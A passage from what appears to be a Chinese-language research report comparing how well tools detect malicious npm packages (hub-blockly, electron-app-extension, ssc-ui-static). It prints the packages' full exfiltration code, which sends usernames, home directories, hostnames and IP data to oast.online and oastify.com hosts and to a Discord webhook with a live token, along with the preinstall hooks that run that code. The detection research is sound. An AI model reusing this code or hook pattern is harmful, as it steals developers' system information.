**行为说明：** Collects system and user data, exfiltrates via HTTPS POST to remote server.

**规避技术：** Uses standard modules, silent error handling, blends with legitimate network activity.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "cmua367pu5a8novkok3gnyzwkyw1zjgdc.oast.online",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/index.js`  
**行号：** `25`  
**标注类型：** `shady-links`

**行为说明：** Collects system and user data, exfiltrates via HTTPS POST to external server.

**规避技术：** Uses standard modules, silent error handling, blends with legitimate network activity.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "cmua367pu5a8novkok3gnyzwkyw1zjgdc.oast.online",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///package/index.js:11:9:11:20""]] to [[""SINK""|""relative:///package/index.js:45:11:45:18""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///package/index.js:12:9:12:21""]] to [[""SINK""|""relative:///package/index.js:45:11:45:18""]] | Flow Count: 4 | Method Name: hostname
[[""SOURCE""|""relative:///package/index.js:13:9:13:21""]] to [[""SINK""|""relative:///package/index.js:45:11:45:18""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///package/index.js:14:10:14:25""]] to [[""SINK""|""relative:///package/index.js:45:11:45:18""]] | Flow Count: 4 | Method Name: getServers","/package/index.js","45","11","45","18"
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/hub-blockly/0.1.8/hub-blockly-0.1.8.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:35
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:45
        req.write(postData);

shady-links: found 1 source code matches
  * This package contains an URL to a domain with a suspicious extension at package/index.js:25
        hostname: "cmua367pu5a8novkok3gnyzwkyw1zjgdc.oast.online",
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m4[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m22 | [0m[35m});[0m
[30;1m23 | [0m[35m[0m
[30;1m24 | [0m[35mvar options = {[0m
[30;1m25 | [0m[35m    hostname: "cmua367pu5a8novkok3gnyzwkyw1zjgdc.oast.online",[0m
[30;1m26 | [0m[35m    port: 443,[0m
[30;1m27 | [0m[35m    path: "/",[0m
[30;1m28 | [0m[35m    method: "POST",[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m4[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m9 | [0m[35m    p: package,[0m
[30;1m10 | [0m[35m    c: __dirname,[0m
[30;1m11 |
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "hub-blockly",
  "version": "0.1.8",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 1,
  "is_malicious": true,
  "analysis_date": "2025-07-11T18:10:18.672292"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/hub-blockly/0.1.8/extracted_hub-blockly-0.1.8.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/hub-blockly/0.1.8/extracted_hub-blockly-0.1.8.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 0.1.8[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mare you ok?[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking relea
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/hub-blockly/0.1.8/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/hub-blockly/0.1.8/package' from local_nodejs...[1m[32mPASS[0m [[34mver 0.1.8[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mare you ok?[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[31mRISK[0m [no readme]

... (truncated)
```

---

## 行为类别：File Operations

**包名：** `electron-app-extension`  
**版本：** `1.0.0`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `28`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Exfiltrates local directory, package name, and hostname to remote server via HTTPS POST.

**规避技术：** Uses standard modules, silent error handling, blends with legitimate network activity.

**恶意代码：**
```javascript
const os = require("os");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    c: __dirname,
    p: package,
    hn: os.hostname(),
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "9w6wg2ilhbraw01jgje698nrxi39r6fv.oastify.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `38`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Exfiltrates local directory, package name, and hostname to remote server via HTTPS POST.

**规避技术：** Uses standard modules, silent error handling, blends with legitimate network activity.

**恶意代码：**
```javascript
const os = require("os");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    c: __dirname,
    p: package,
    hn: os.hostname(),
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "9w6wg2ilhbraw01jgje698nrxi39r6fv.oastify.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/index.js`  
**行号：** `18`  
**标注类型：** `shady-links`

**行为说明：** Exfiltrates local directory, package name, and hostname to remote server via HTTPS POST.

**规避技术：** Uses standard modules, silent error handling, blends with legitimate network activity.

**恶意代码：**
```javascript
const os = require("os");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    c: __dirname,
    p: package,
    hn: os.hostname(),
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "9w6wg2ilhbraw01jgje698nrxi39r6fv.oastify.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 4

**文件：** `package/package.json`  
**行号：** `8`  
**标注类型：** `npm-install-script`

**行为说明：** Executes index.js automatically before install, enabling arbitrary code execution on npm install.

**规避技术：** Abuses npm preinstall script to trigger hidden code before package installation completes.

**恶意代码：**
```javascript
"scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "node index.js"
  }
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 4 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/electron-app-extension/1.0.0/electron-app-extension-1.0.0.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:28
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:38
        req.write(postData);

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:8
        "preinstall": "node index.js"

shady-links: found 1 source code matches
  * This package contains an URL to a domain with a suspicious extension at package/index.js:18
        hostname: "9w6wg2ilhbraw01jgje698nrxi39r6fv.oastify.com",
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m4[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main": "index.js",[0m
[30;1m6 | [0m[35m  "scripts": {[0m
[30;1m7 | [0m[35m    "test": "echo \"Error: no test specified\" && exit 1",[0m
[30;1m8 | [0m[35m    "preinstall": "node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author": "",[0m
[30;1m11 | [0m[35m  "license": "ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m4[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m15 | [0m[35m});[0m
[30;1m16 
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "electron-app-extension",
  "version": "1.0.0",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 1,
  "is_malicious": true,
  "analysis_date": "2025-07-12T16:23:39.850206"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/electron-app-extension/1.0.0/extracted_electron-app-extension-1.0.0.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/electron-app-extension/1.0.0/extracted_electron-app-extension-1.0.0.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.0.0[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscr
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/electron-app-extension/1.0.0/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/electron-app-extension/1.0.0/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.0.0[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[31mRISK
... (truncated)
```

---

## 行为类别：Malicious Payload Delivery

**包名：** `ssc-ui-static`  
**版本：** `6.2.4`

### 代码上下文

#### 片段 1

**文件：** `tmp/tmp5riqgego/ssc-ui-static/package/index.js`  
**行号：** `24`  
**标注类型：** `shady-links`

**行为说明：** Fetches external IP and organization info from ipinfo.io using HTTPS GET request.

**规避技术：** Uses legitimate public API, blends with normal network activity, no user notification.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

const package = packageJSON.name;

// Function to get the internal IP address
function getIPAddress() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'IP not found';
}

// Function to get the external IP address
function getExternalIP(callback) {
    https.get('https://ipinfo.io/json', (res) => {
        let data = '';

        // Receive data chunks
        res.on('data', (chunk) => {
            data += chunk;
        });

        // On response end, parse and return the IP address
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org}); // Call the callback with the external IP address
        });
    }).on('error', (e) => {
        console.error('Error fetching external IP address:', e);
        callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'}); // Handle errors
    });
}
```

**形式化行为：** sensitive_data_collection

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `tmp/tmp5riqgego/ssc-ui-static/package/index.js`  
**行号：** `62`  
**标注类型：** `shady-links`

**行为说明：** Collects system and user data, exfiltrates to Discord webhook via HTTPS POST.

**规避技术：** Uses legitimate modules, blends with normal code, no user notification, silent background execution.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

const package = packageJSON.name;

function getIPAddress() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'IP not found';
}

function getExternalIP(callback) {
    https.get('https://ipinfo.io/json', (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org});
        });
    }).on('error', (e) => {
        console.error('Error fetching external IP address:', e);
        callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'});
    });
}

getExternalIP((externalIP) => {
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(),
        external_ip: externalIP.ip,
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
        package_version: packageJSON.version,
        package_json: packageJSON,
        package_type: 'npm',
    });

    const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS";

    const postData = JSON.stringify({
        content: `\json\n${trackingData}\n\`
    });

    const options = new URL(webhookURL);
    options.method = "POST";
    options.headers = {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    };

    const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        console.error(e);
    });

    req.write(postData);
    req.end();
});
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `tmp/tmp5riqgego/ssc-ui-static/package/index.js`  
**行号：** `76`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system/user info and exfiltrates via Discord webhook using HTTPS POST.

**规避技术：** Uses legitimate modules, disguises as analytics, sends data to Discord webhook.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

const package = packageJSON.name;

function getIPAddress() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'IP not found';
}

function getExternalIP(callback) {
    https.get('https://ipinfo.io/json', (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org});
        });
    }).on('error', (e) => {
        console.error('Error fetching external IP address:', e);
        callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'});
    });
}

getExternalIP((externalIP) => {
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(),
        external_ip: externalIP.ip,
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
        package_version: packageJSON.version,
        package_json: packageJSON,
        package_type: 'npm',
    });

    const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS";

    const postData = JSON.stringify({
        content: `\json\n${trackingData}\n\` 
    });

    const options = new URL(webhookURL);
    options.method = "POST";
    options.headers = {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    };

    const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        console.error(e);
    });

    req.write(postData);
    req.end();
});
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 4

**文件：** `tmp/tmp5riqgego/ssc-ui-static/package/index.js`  
**行号：** `86`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system/user data and exfiltrates it to a Discord webhook via HTTPS POST.

**规避技术：** Uses legitimate modules, disguises as analytics, sends data to Discord webhook to avoid suspicion.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

const package = packageJSON.name;

function getIPAddress() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'IP not found';
}

function getExternalIP(callback) {
    https.get('https://ipinfo.io/json', (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org});
        });
    }).on('error', (e) => {
        console.error('Error fetching external IP address:', e);
        callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'});
    });
}

getExternalIP((externalIP) => {
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(),
        external_ip: externalIP.ip,
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
        package_version: packageJSON.version,
        package_json: packageJSON,
        package_type: 'npm',
    });

    const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS";

    const postData = JSON.stringify({
        content: `\json\n${trackingData}\n\` 
    });

    const options = new URL(webhookURL);
    options.method = "POST";
    options.headers = {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    };

    const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        console.error(e);
    });

    req.write(postData);
    req.end();
});
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 5

**文件：** `tmp/tmp5riqgego/ssc-ui-static/package/package.json`  
**行号：** `1`  
**标注类型：** `npm-install-script`

**行为说明：** Runs node index.js automatically on install via preinstall npm script.

**规避技术：** Abuses preinstall script in package.json to execute code before install, hiding in standard npm workflow.

**恶意代码：**
```javascript
{
  "name": "ssc-ui-static",
  "version": "6.2.4",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "node index.js"
  },
  "author": "",
  "license": "ISC"
}
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:48:25:48:36""]] to [[""SINK""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:86:15:86:22""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:49:19:49:31""]] to [[""SINK""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:86:15:86:22""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:50:14:50:29""]] to [[""SINK""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:86:15:86:22""]] | Flow Count: 4 | Method Name: getServers
[[""SOURCE""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:51:28:51:40""]] to [[""SINK""|""relative:///tmp/tmp5riqgego/ssc-ui-static/package/index.js:86:15:86:22""]] | Flow Count: 4 | Method Name: hostname","/tmp/tmp5riqgego/ssc-ui-static/package/index.js","86","15","86","22"
```

#### GUARDDOG

```
Found 5 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/ssc-ui-static/6.2.4/2024-11-21-ssc-ui-static-v6.2.4.tgz

shady-links: found 2 source code matches
  * This package contains an URL to a domain with a suspicious extension at tmp/tmp5riqgego/ssc-ui-static/package/index.js:24
        https.get('https://ipinfo.io/json', (res) => {
  * This package contains an URL to a domain with a suspicious extension at tmp/tmp5riqgego/ssc-ui-static/package/index.js:62
